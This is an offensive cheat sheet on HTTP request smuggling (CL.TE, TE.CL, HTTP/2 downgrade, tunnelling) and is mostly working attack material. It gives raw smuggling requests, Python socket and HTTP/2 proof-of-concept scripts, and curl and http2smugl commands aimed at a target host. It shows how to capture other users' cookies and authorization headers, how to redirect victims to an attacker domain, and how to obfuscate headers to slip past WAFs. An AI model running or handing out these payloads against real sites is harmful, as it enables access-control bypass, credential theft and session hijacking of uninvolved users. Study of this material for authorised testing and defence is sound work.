# HTTP Request Smuggling — Advanced Techniques

Advanced desync attacks beyond basic CL.TE/TE.CL: HTTP/2 downgrade, h2.cl, h2.te, request tunnelling, and response queue poisoning.

## Install

```bash
# smuggler.py — automated detection:
git clone https://github.com/defparam/smuggler /opt/smuggler
pip install requests --break-system-packages

# http2smugl:
pip install http2smugl --break-system-packages

# turbo-intruder (Burp extension) — use via caido or manual curl

# h2c smuggling test:
pip install h2 --break-system-packages   # Python HTTP/2 library
```

---

## Phase 1: Detection — Identify Vulnerability Type

```bash
# Automated scan (all variants):
python3 /opt/smuggler/smuggler.py -u https://target.com/

# Manual: CL.TE detection (frontend uses Content-Length, backend uses Transfer-Encoding)
curl -s -X POST https://target.com/ \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -H "Connection: keep-alive" \
  --data $'3\r\nGET\r\n0\r\n\r\n' \
  --http1.1 -v

# Manual: TE.CL detection (frontend TE, backend CL)
curl -s -X POST https://target.com/ \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 3" \
  --data $'0\r\n\r\nG' \
  --http1.1 -v

# Timing-based detection (send ambiguous request — if timeout = vulnerable):
# CL.TE timing: send Content-Length that's longer than actual body
# TE.CL timing: send chunked body with final 0 chunk missing
```

---

## Phase 2: CL.TE — Classic Attack

```bash
# Frontend: Content-Length | Backend: Transfer-Encoding
# Effect: prefix next victim's request with attacker-controlled data

# Step 1: Send smuggling request:
POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked
Connection: keep-alive

e
GET /admin HTTP/1.1
X-Ignore: 0

0


# Step 2: Immediately send innocent request:
GET / HTTP/1.1
Host: target.com

# Backend sees:
# GET /admin HTTP/1.1
# X-Ignore: 0GET / HTTP/1.1  ← victim's request appended
```

```python
# Python PoC — CL.TE:
import socket

def send_raw(host, port, data):
    s = socket.socket()
    s.connect((host, port))
    s.send(data.encode())
    resp = b""
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        resp += chunk
    s.close()
    return resp.decode(errors='replace')

smuggle = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 49\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "e\r\n"
    "GET /admin HTTP/1.1\r\n"
    "X-Ignore: X\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
)
print(send_raw("target.com", 80, smuggle))
```

---

## Phase 3: TE.CL — Reverse Attack

```bash
# Frontend: Transfer-Encoding | Backend: Content-Length
# Frontend strips TE header and passes body using CL

POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


# Backend reads 3 bytes of body: "8\r\n" but "SMUGGLED\r\n0\r\n\r\n" leaks into next request
```

---

## Phase 4: HTTP/2 Downgrade — h2.cl

```bash
# h2.cl: send HTTP/2 request with Content-Length mismatch
# Frontend: HTTP/2 (ignores Content-Length, uses DATA frame length)
# Backend: HTTP/1.1 (uses Content-Length — wrong value = smuggle)

# Test with http2smugl:
http2smugl request https://target.com/ \
  --header "content-length: 0" \
  --data "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"

# Python h2 library:
python3 -c "
import socket, ssl, h2.connection, h2.config, h2.events

# Connect via TLS:
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
s = socket.create_connection(('target.com', 443))
tls = ctx.wrap_socket(s, server_hostname='target.com')

# H2 connection:
config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
tls.sendall(conn.data_to_send())

# Send smuggling request with incorrect content-length:
headers = [
    (':method', 'POST'),
    (':path', '/'),
    (':scheme', 'https'),
    (':authority', 'target.com'),
    ('content-type', 'application/x-www-form-urlencoded'),
    ('content-length', '0'),  # claims 0 bytes
]
smuggled_body = b'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n'

conn.send_headers(1, headers)
conn.send_data(1, smuggled_body, end_stream=True)  # actual data != content-length
tls.sendall(conn.data_to_send())
"
```

---

## Phase 5: h2.te — HTTP/2 + Transfer-Encoding

```bash
# Some backends accept Transfer-Encoding header via H2 downgrade
# H2 spec forbids TE header, but some parsers pass it through

http2smugl request https://target.com/ \
  --header "transfer-encoding: chunked" \
  --data $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n'

# Variations to test (obfuscated TE header):
# transfer-encoding: xchunked
# Transfer-Encoding: chunked, identity
# Transfer-Encoding:\tchunked
# Transfer-Encoding: chunked\r\nTransfer-Encoding: x
# x-transfer-encoding: chunked (some parsers forward custom headers)
```

---

## Phase 6: Request Queue Poisoning (Response Desync)

```bash
# Poison the response queue: smuggle response to different user

# Step 1: Send request that smuggles a fake complete HTTP/1.1 request:
POST / HTTP/1.1
Host: target.com
Content-Length: 73
Transfer-Encoding: chunked

0

GET /redirect?url=https://attacker.com HTTP/1.1
Host: target.com
Foo: bar

# Next victim GET / gets redirected to attacker (session hijack potential)
```

---

## Phase 7: Advanced Impact Chains

### Capture Victim Credentials via Request Smuggling

```bash
# 1. Find storage endpoint (e.g. search with reflected input)
# 2. Smuggle prefix that stores next request's body at /search?q=<VICTIM_REQUEST_HERE>

POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: target.com
Content-Length: 500
Content-Type: application/x-www-form-urlencoded

q=
# Victim's entire request (including Authorization/Cookie headers) is appended as q= value
# Retrieve from /search?q=... to extract captured data
```

### Bypass Front-End Security Controls

```bash
# Frontend restricts /admin — backend doesn't check twice
POST / HTTP/1.1
Host: target.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
# Next request from any user will access /admin via backend
```

### Gain Privileged Access via Rewrite

```bash
# If frontend adds X-Forwarded-Host or X-Real-IP:
# Smuggled request bypasses frontend header injection → arrives without trusted headers
POST / HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /internal-api HTTP/1.1
Host: localhost
X-Internal-Auth: true  # internal header that frontend would strip
```

---

## Phase 8: Detection Evasion & Obfuscation

```bash
# TE header obfuscation (bypass WAF/frontend normalization):
Transfer-Encoding: xchunked
Transfer-Encoding : chunked              # space before colon
Transfer-Encoding: chunked, identity     # identity at end
Transfer-Encoding:
 chunked                                  # newline before value
X: X\r\nTransfer-Encoding: chunked       # header injection

# Mixed case:
tRaNsFeR-eNcOdInG: chunked

# With comment:
Transfer-Encoding: chunked; ext=value

# Double header (frontend uses first, backend uses second):
Transfer-Encoding: identity
Transfer-Encoding: chunked
```

---

## Phase 9: Tunnelling via HTTP/2 (New Attack — 2023+)

```bash
# HTTP/2 request tunnelling: bypass TLS termination
# Send raw HTTP/1.1 inside HTTP/2 body to backend that forwards it

# Target: load balancer does H2 termination → sends H1 to backend
# Attack: include full raw H1 request as H2 body → backend executes it directly

python3 -c "
# H2 HEADERS frame with no Content-Length + H2 DATA = raw H1 request
h2_request_body = b'GET /admin HTTP/1.1\r\nHost: internal-backend.local\r\nAuthorization: Bearer supertoken\r\n\r\n'
# Send via H2 connection as DATA frame
# Backend (if confused) executes this as a new H1 request
"

# Test for tunnel via timing:
# Send H2 request with H1 body that references slow endpoint
# If second response is delayed → tunnel confirmed
```

---

## Automated Testing Tools

```bash
# Smuggler — most comprehensive automated tool:
python3 /opt/smuggler/smuggler.py -u https://target.com/ --log
python3 /opt/smuggler/smuggler.py -u https://target.com/ -m POST -p 443

# For each found variant, manually verify with raw socket:
python3 /opt/smuggler/smuggler.py -u https://target.com/ -t CL.TE --confirm

# HTTP/2 specific:
http2smugl detect https://target.com/
http2smugl request https://target.com/ --header "content-length: 3" --data "abc"
```

---

## Pro Tips

1. **Always test with timing first** — send ambiguous request; if 10s timeout = vulnerability present
2. **h2.cl is most common in 2024** — many modern stacks do H2 termination + H1 backend
3. **TE obfuscation** — try all variants in Phase 8; some WAFs block `Transfer-Encoding: chunked` but not obfuscated forms
4. **Capture victim technique** — store victim request body via search/comment endpoint = cookie/token theft
5. **Use Caido's Replay tab** for raw HTTP/1.1 testing without automatic header normalization
6. **tunnel ≠ smuggling** — HTTP/2 tunnelling is a separate class; smuggler.py won't catch it

## Summary

Smuggling flow: automated scan with `smuggler.py` → verify with raw socket test → identify impact (bypass access control / capture requests / response poisoning) → h2 downgrade test with `http2smugl` → chain with SSRF or privilege bypass for full exploit.
